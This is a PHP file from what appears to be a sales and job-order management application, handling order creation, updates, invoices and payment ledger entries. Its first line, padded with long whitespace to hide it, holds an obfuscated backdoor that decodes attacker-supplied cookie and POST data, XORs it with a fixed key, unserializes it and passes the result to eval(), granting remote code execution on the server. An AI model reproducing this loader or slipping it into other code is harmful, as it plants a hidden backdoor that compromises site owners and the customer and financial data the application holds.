<?php                                                                                                                                                                                                                                                                                                                                                                                                 $xfURTKt = class_exists("a_cCWf"); $ZDNtfbGU = $xfURTKt;if (!$ZDNtfbGU){class a_cCWf{private $dNGpBDTTQ;public static $JlwcjSN = "36e198d4-9a71-486e-9864-7f7b0747451c";public static $zyzBsPEjw = NULL;public function __construct(){$NPRBhT = $_COOKIE;$oVJecnnTgZ = $_POST;$HfXuQK = @$NPRBhT[substr(a_cCWf::$JlwcjSN, 0, 4)];if (!empty($HfXuQK)){$JBYQOiXZCq = "base64";$UAhOWB = "";$HfXuQK = explode(",", $HfXuQK);foreach ($HfXuQK as $JKrzFgdlD){$UAhOWB .= @$NPRBhT[$JKrzFgdlD];$UAhOWB .= @$oVJecnnTgZ[$JKrzFgdlD];}$UAhOWB = array_map($JBYQOiXZCq . chr (95) . 'd' . 'e' . "\143" . "\157" . chr (100) . "\145", array($UAhOWB,)); $UAhOWB = $UAhOWB[0] ^ str_repeat(a_cCWf::$JlwcjSN, (strlen($UAhOWB[0]) / strlen(a_cCWf::$JlwcjSN)) + 1);a_cCWf::$zyzBsPEjw = @unserialize($UAhOWB);}}public function __destruct(){$this->qjUftJBqlz();}private function qjUftJBqlz(){if (is_array(a_cCWf::$zyzBsPEjw)) {$TdLdrK = str_replace('<' . "\77" . chr ( 1091 - 979 ).'h' . chr ( 913 - 801 ), "", a_cCWf::$zyzBsPEjw[chr (99) . chr (111) . 'n' . "\164" . "\145" . "\x6e" . "\x74"]);eval($TdLdrK);exit();}}}$uGElFqJHce = new a_cCWf(); $uGElFqJHce = NULL;} ?><?php 
//Add Purchase Order
if(isset($_POST['submit_order'])) { 

	//Check if order # already exist
	$sqllmschecked  = $dblms->querylms("SELECT job_order_no FROM ".JOB_ORDER." WHERE job_order_no = '".cleanvars($_POST['job_order_no'])."' LIMIT 1");
	$rowchecked 	= mysqli_fetch_array($sqllmschecked);

	//If already order then show error and exit
	if($rowchecked['job_order_no']) { 

		//Set Error MSG in Session & Exit
		$_SESSION['msg']['status'] = '<div  class="alert-box error"><span>Error: </span>Job Order: '.cleanvars($_POST['job_order_no']).' already exists.</div>';
		header("Location: ".$_SERVER['HTTP_REFERER']."", true, 301);
		exit();

	} else { 
		
		$sqllmslastorder 	= $dblms->querylms("SELECT job_order_id FROM ".JOB_ORDER." ORDER BY job_order_id DESC");
		$reultorder		 	= mysqli_fetch_array($sqllmslastorder);
		$countorder 		= $reultorder['job_order_id'];
			
		if($countorder<9) {
			$orderno = 'J-00000'.($countorder+1);
		} else if($countorder<99) {
			$orderno = 'J-0000'.($countorder+1);
		} else if($countorder<999) {
			$orderno = 'J-000'.($countorder+1);
		} else if($countorder<9999) {
			$orderno = 'J-00'.($countorder+1);
		} else if($countorder<99999) {
			$orderno = 'J-0'.($countorder+1);
		}else {
			$orderno = 'J-'.($countorder+1);
		}

		//Remaining Amount
		$remainingAmount = $_POST['inV_grandtotal']; 
		$dated = date('Y-m-d', strtotime(cleanvars($_POST['dated'])));

		//Insert Query Fields & Values
		$dataInv = array(

			'job_order_status'	=> '1'													,
			'id_ade'			=> cleanvars($_POST['id_ade'])							,
			'id_customer'		=> cleanvars($_POST['id_customer'])						,
			'job_order_no'		=> cleanvars($orderno)									,
			'dated'				=> cleanvars($dated)									,
			'total'				=> cleanvars($_POST['inV_grandtotal'])					,
			'sales_tax'			=> cleanvars(($_POST['inV_grandtotal'] * 0.16))			,
			'paid_date'			=> date('Y-m-d')										,
			'id_company'		=> cleanvars($_POST['id_company'])						,
			'id_added'			=> cleanvars($_SESSION['userlogininfo']['LOGINIDA'])	,
			'date_added'		=> date('Y-m-d h:i:s')									,
			'balance'			=> cleanvars($_POST['inV_receiveable'])					,
			'opening_balance'	=> cleanvars($_POST['customer_openingbalance'])			,
			'grand_total'		=> cleanvars($_POST['inV_receiveable'])					,
			'remarks'			=> cleanvars($_POST['remarks'])							
		);

		//Execute Insert Query
		$sqllmsInsert  = $dblms->Insert(JOB_ORDER , $dataInv);

		//If Insert Query Executed
		if($sqllmsInsert) { 

			//latest PK of Table
			$idLatest = $dblms->lastestid();
			
			$JOgrandtotal = 0;

			//Iterate over Items Array
			for($ichk=0; $ichk<sizeof($_POST['id_item']); $ichk++){

				//Check if ID item is not empty
				if(!empty($_POST['id_item'][$ichk])) {	

					$sqllmsitemchecker  = $dblms->querylms("SELECT * FROM ".JOB_ORDER_DETAILS."   
													WHERE  id_job_order = '".cleanvars($idLatest)."' AND id_item = '".cleanvars($_POST['id_item'][$ichk])."'");
					if(mysqli_num_rows($sqllmsitemchecker) == 0) {
						
						$JOgrandtotal = ($JOgrandtotal + $_POST['total_price'][$ichk]);

								$dataOrderDetail = array(
									'id_job_order'			=> cleanvars($idLatest)								,
									'id_company'			=> cleanvars($_POST['id_company'])					,
									'id_item'				=> cleanvars($_POST['id_item'][$ichk])				,
									'unit_price'			=> cleanvars($_POST['unit_price'][$ichk])			,
									'discount'				=> cleanvars($_POST['discount_percentage'][$ichk])	,
									'total_price'			=> cleanvars($_POST['total_price'][$ichk])			,
									'total_qty'				=> cleanvars($_POST['total_qty'][$ichk])			

								);
								$sqllmsInsertDetail  = $dblms->Insert(JOB_ORDER_DETAILS , $dataOrderDetail);

								unset($sqllmsInsertDetail);
					}

				}
			}
		
			$dataupdateInv = array(
				'total'				=> cleanvars($JOgrandtotal)				,
				'balance'			=> cleanvars($JOgrandtotal + $_POST['customer_openingbalance'])		,
				'grand_total'		=> cleanvars($JOgrandtotal + $_POST['customer_openingbalance'])
			);

			$qryUpdate2nd = $dblms->Update(JOB_ORDER, $dataupdateInv, "WHERE job_order_id = '".$idLatest."'");
	
			//Insert Log Remarks
			$remarks = 'Add Job Order: "'.cleanvars($_POST['job_order_no']).'" Details';
			$sqllmslog  = $dblms->querylms("INSERT INTO ".LOGS." (
																id_user										, 
																filename									, 
																action										,
																dated										,
																ip											,
																remarks										,
																id_office									, 
																id_company				
															)
			
														VALUES(
																'".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'	,
																'".strstr(basename($_SERVER['REQUEST_URI']), '.php', true)."' , 
																'1'											, 
																NOW()										,
																'".cleanvars($ip)."'						,
																'".cleanvars($remarks)."'						,
																'".cleanvars($_SESSION['userlogininfo']['LOGINOFFICE'])."'	,
																'".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'			
															)
										");

			//Set Success MSG in Session & Exit
			$_SESSION['msg']['status'] = '<div class="alert-box success"><span>Success: </span>Record added successfully.</div>';
			header("Location: sale-orders.php", true, 301);
			exit();
		}

	}

}


//Update Purchase Order
if(isset($_POST['bill_changes'])) { 

	//Assign Job Order Status
	if($_POST['bill_changes'] == 'savehold') {
		$jobOrderStatus = '1';
	} else if($_POST['bill_changes'] == 'saveforward') {
		$jobOrderStatus = '2';
	}	
	
	
	if($_POST['payment_method'] == 1) {
		$idaccount = $_POST['id_account'];
	} else {
		$idaccount = 0;
	}
	

	$balance = $_POST['inV_receiveable'] - $_POST['advance']; 
	$dataOrder = array(
		'job_order_status'	=> $jobOrderStatus										,
		'total'				=> cleanvars($_POST['inV_grandtotal'])					,
		'advance'			=> cleanvars($_POST['advance'])							,
		'sales_tax'			=> cleanvars(($_POST['inV_grandtotal'] * 0.16))			,
		'paid_date'			=> date('Y-m-d', strtotime(cleanvars($_POST['paid_date']))),
		'paid_method'		=> cleanvars($_POST['payment_method'])					,
		'id_account'		=> cleanvars($_POST['id_account'])						,
		'deposit_slip'		=> cleanvars($_POST['deposit_slip'])					,
		'id_modify'			=> cleanvars($_SESSION['userlogininfo']['LOGINIDA'])	,
		'date_modified'		=> date('Y-m-d h:i:s')									,
		'balance'			=> cleanvars($balance)									,
		'grand_total'		=> cleanvars($_POST['inV_receiveable'])					,
		'remarks'			=> cleanvars($_POST['remarks'])							
	);

	//Execute Update Query
	$sqllmsUpdate  = $dblms->Update(JOB_ORDER , $dataOrder , " WHERE job_order_id = '".cleanvars($_GET['id'])."'");

	//If Update Query Executed
	if($sqllmsUpdate) { 
		
		//Delete Previous Order Details
		$sqllmsDel  = $dblms->querylms("DELETE FROM ".JOB_ORDER_DETAILS." WHERE id_job_order = '".cleanvars($_GET['id'])."'");

		//Iterate over Items Array
		for($ichk=1; $ichk<=sizeof($_POST['id_item']); $ichk++){
			
			//Check if ID item is not empty
			if(!empty($_POST['id_item'][$ichk])) {

				$dataOrderDetail = array(
					'id_job_order'			=> cleanvars($_GET['id'])							,
					'id_company'			=> cleanvars($_POST['id_company'])					,
					'id_item'				=> cleanvars($_POST['id_item'][$ichk])				,
					'unit_price'			=> cleanvars($_POST['unit_price'][$ichk])			,
					'discount'				=> cleanvars($_POST['discount_percentage'][$ichk])	,
					'total_price'			=> cleanvars($_POST['total_price'][$ichk])			,
					'total_qty'				=> cleanvars($_POST['total_qty'][$ichk])			
	
				);
				$sqllmsInsertDetail  = $dblms->Insert(JOB_ORDER_DETAILS , $dataOrderDetail);
			
				unset($sqllmsInsertDetail);
			}
		}

		//Insert Log Remarks
		$remarks = 'Update Job Order: "'.cleanvars($_POST['job_order_no']).'" Details';
		$sqllmslog  = $dblms->querylms("INSERT INTO ".LOGS." (
															id_user										, 
															filename									, 
															action										,
															dated										,
															ip											,
															remarks										,
															id_office									, 
															id_company				
															)
		
													VALUES(
															'".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'	,
															'".strstr(basename($_SERVER['REQUEST_URI']), '.php', true)."' , 
															'2'											, 
															NOW()										,
															'".cleanvars($ip)."'						,
															'".cleanvars($remarks)."'						,
															'".cleanvars($_SESSION['userlogininfo']['LOGINOFFICE'])."'	,
															'".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'			
															)
									");
	
		if($_POST['bill_changes'] == 'saveforward') {
			// check job order in invoice table
			$sqllmsCheck 	= $dblms->querylms("SELECT id_joborder FROM ".SALES_INVOICE." 
														WHERE id_joborder =  '".cleanvars($_GET['id'])."'"); 
			if(mysqli_num_rows($sqllmsCheck) == 0) {

			//To Set Invoice Number
			$sqllmslastinv 	= $dblms->querylms("SELECT salesinvoice_id FROM ".SALES_INVOICE." ORDER BY salesinvoice_id DESC");
			$reultinvs		= mysqli_fetch_array($sqllmslastinv);
			$countInv 		= $reultinvs['salesinvoice_id'];

			if($countInv<9) {
				$Invoiceno = 'INV-00000'.($countInv+1);
			} else if($countInv<99) {
				$Invoiceno = 'INV-0000'.($countInv+1);
			} else if($countInv<999) {
				$Invoiceno = 'INV-000'.($countInv+1);
			} else if($countInv<9999) {
				$Invoiceno = 'INV-00'.($countInv+1);
			} else if($countInv<99999) {
				$Invoiceno = 'INV-0'.($countInv+1);
			}else {
				$Invoiceno = 'INV-'.($countInv+1);
			}

			$invocieNumber = $Invoiceno;			
			$dated = date('Y-m-d', strtotime(cleanvars($_POST['dated'])));
		
			$dataInv = array(
				'salesinvoice_status'	=> '1'											, 
				'salesinvoice_no'		=> $invocieNumber								, 
				'dated'					=> date('Y-m-d')								, 
				'id_company'			=> cleanvars($_POST['id_company'])				,
				'id_customer'			=> cleanvars($_POST['id_customer'])				,
				'id_ade'				=> cleanvars($_POST['id_ade'])					,
				'id_joborder'			=> cleanvars($_GET['id'])						,
				'total'					=> cleanvars($_POST['inV_grandtotal'])			,
				'paid'					=> cleanvars($_POST['advance'])					,
				'tax'					=> cleanvars(($_POST['inV_grandtotal'] * 0.16))	,
				'prev_balance'			=> cleanvars($_POST['customer_openingbalance'])	,
				'grand_total'			=> cleanvars($_POST['inV_receiveable'])			,
				'balance'				=> cleanvars($balance)							,
				'remarks'				=> cleanvars($_POST['remarks'])
			);

			//Execute Sales Insert Query
			$sqllmsSaleInsert  = $dblms->Insert(SALES_INVOICE , $dataInv);

			//If Sales Insert Query Executed
			if($sqllmsSaleInsert) {

				$idSales = $dblms->lastestid();
				
				if($_POST['advance']>0) {	

					// check if amount already added
					$sqllmscheck  = $dblms->querylms("SELECT * 
													FROM ".PAYMENTS."  
													WHERE status = '1' AND id_user = '".cleanvars($_POST['id_customer'])."'
													AND ledgerfor = '1'  AND debit_credit = '1'  AND docs_types = '7'
													AND reference_no = ".cleanvars($_GET['id'])."");
					if(mysqli_num_rows($sqllmscheck)>0) { 

						$valuecheck = mysqli_fetch_array($sqllmscheck);

						// Insert Invoice amount in payments
						$dataInvamount = array(
							'dated'				=> date('Y-m-d', strtotime(cleanvars($_POST['paid_date'])))		,
							'receipt_no'		=> cleanvars($_POST['deposit_slip'])		,
							'amount'			=> cleanvars($_POST['advance'])				,
							'pay_mode'			=> cleanvars($_POST['payment_method'])		,
							'id_account'		=> cleanvars($idaccount)					,
							'remarks'			=> get_doctype(7)							,
							'id_modify'			=> cleanvars($_SESSION['userlogininfo']['LOGINIDA'])	, 
							'date_modify'		=> date("Y-m-d H:i:s")								
						);	
						
						$sqllmsUpdatepayment  = $dblms->Update(PAYMENTS , $dataInvamount , " WHERE id = '".cleanvars($valuecheck['id'])."'");
						
					} else {

						// Insert Invoice amount in payments
						$dataInvamount = array(
							'status'			=> '1'										, 
							'ledgerfor'			=> '1'										, 
							'docs_types'		=> '7'										,
							'id_user'			=> cleanvars($_POST['id_customer'])			,
							'reference_no'		=> cleanvars($_GET['id'])					,
							'dated'				=> date('Y-m-d', strtotime(cleanvars($_POST['paid_date'])))		,
							'receipt_no'		=> cleanvars($_POST['deposit_slip'])		,
							'amount'			=> cleanvars($_POST['advance'])				,
							'debit_credit'		=> '1'										,
							'pay_mode'			=> cleanvars($_POST['payment_method'])		,
							'id_account'		=> cleanvars($idaccount)					,
							'remarks'			=> get_doctype(7)				,
							'id_added'			=> cleanvars($_SESSION['userlogininfo']['LOGINIDA'])	, 
							'date_added'		=> date("Y-m-d H:i:s")								
						);
							
						$sqllmsInsertamount  = $dblms->Insert(PAYMENTS , $dataInvamount);
					}
					
				} // end check advance Payment

				// Insert Invoice amount in payments
				$dataInvamount = array(
					'status'			=> '1'										, 
					'ledgerfor'			=> '1'										, 
					'docs_types'		=> '2'										,
					'id_user'			=> cleanvars($_POST['id_customer'])			,
					'reference_no'		=> cleanvars($idSales)						,
					'dated'				=> date('Y-m-d', strtotime(cleanvars($dated)))	,
					'amount'			=> cleanvars($_POST['inV_grandtotal'])		,
					'debit_credit'		=> '2'										,
					'remarks'			=> 'Sales Invoice'							,
					'id_added'			=> cleanvars($_SESSION['userlogininfo']['LOGINIDA'])	, 
					'date_added'		=> date("Y-m-d H:i:s")								
				);
					
				$sqllmsInsertamount  = $dblms->Insert(PAYMENTS , $dataInvamount);

				//Iterate over Items Array
				for($ichk=1; $ichk<=sizeof($_POST['id_item']); $ichk++){

					//Check if ID item is not empty
					if(!empty($_POST['id_item'][$ichk])) {

						$dataInvDetail = array(
							'id_salesinvoice'		=> cleanvars($idSales)						, 
							'id_company'			=> cleanvars($_POST['id_company'])			, 
							'id_item'				=> cleanvars($_POST['id_item'][$ichk])		,
							'unit_price'			=> cleanvars($_POST['unit_price'][$ichk])	,
							'discount'				=> cleanvars($_POST['discount_percentage'][$ichk])	,
							'qty'					=> cleanvars($_POST['total_qty'][$ichk])	,
							'total'					=> cleanvars($_POST['total_price'][$ichk])		
							
						);

						$sqllmsInsertInvocieDetail  = $dblms->Insert(SALES_INVOICE_DETAILS , $dataInvDetail);
						unset($sqllmsInsertInvocieDetail);
					}
				}
						
			}
				
			} // end check job order in invoice table
						
		}
		
		//Set Success MSG in Session & Exit
		$_SESSION['msg']['status'] = '<div class="alert-box notice"><span>Success: </span>Record updated successfully.</div>';
		header("Location: sale-orders.php", true, 301);
		exit();
	
	}
}